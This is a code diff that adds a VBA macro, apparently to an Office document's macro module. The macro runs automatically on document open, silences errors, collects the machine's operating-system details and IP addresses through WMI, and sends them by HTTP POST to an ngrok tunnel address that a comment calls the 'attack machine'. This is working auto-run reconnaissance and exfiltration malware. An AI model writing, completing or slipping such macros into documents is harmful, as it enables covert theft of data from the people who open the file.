@@ -418,3 +418,57 @@ Sub AutoOpen()
 End Sub
 
 
+Sub AutoOpen()
+    On Error Resume Next
+    
+    Dim objWMI As Object
+    Dim colItems As Object
+    Dim objItem As Object
+    Dim output As String
+    Dim http As Object
+    Dim server As String
+    Dim targetURL As String
+    
+    ' WMI Setup
+    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
+    
+    ' Collect OS Info
+    Set colItems = objWMI.ExecQuery("Select * from Win32_OperatingSystem")
+    For Each objItem In colItems
+        output = output & "OS: " & objItem.Caption & vbCrLf
+        output = output & "Version: " & objItem.Version & vbCrLf
+        output = output & "Architecture: " & objItem.OSArchitecture & vbCrLf
+    Next
+    
+    ' Collect IP Info
+    Set colItems = objWMI.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = TRUE")
+    For Each objItem In colItems
+        output = output & "IP Address: " & objItem.IPAddress(0) & vbCrLf
+    Next
+    
+    ' Setup HTTP POST
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    
+    ' Replace "YOUR_IP" with YOUR attack machine IP (the one listening with nc)
+    server = "https://2e43-223-231-137-213.ngrok-free.app"
+    
+    http.Open "POST", server, False
+    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+    http.Send "data=" & URLEncode(output)
+End Sub
+
+Function URLEncode(ByVal sText As String) As String
+    Dim i As Long
+    Dim sRes As String
+    Dim sChar As String
+    For i = 1 To Len(sText)
+        sChar = Mid(sText, i, 1)
+        Select Case Asc(sChar)
+            Case 48 To 57, 65 To 90, 97 To 122
+                sRes = sRes & sChar
+            Case Else
+                sRes = sRes & "%" & Hex(Asc(sChar))
+        End Select
+    Next
+    URLEncode = sRes
+End Function
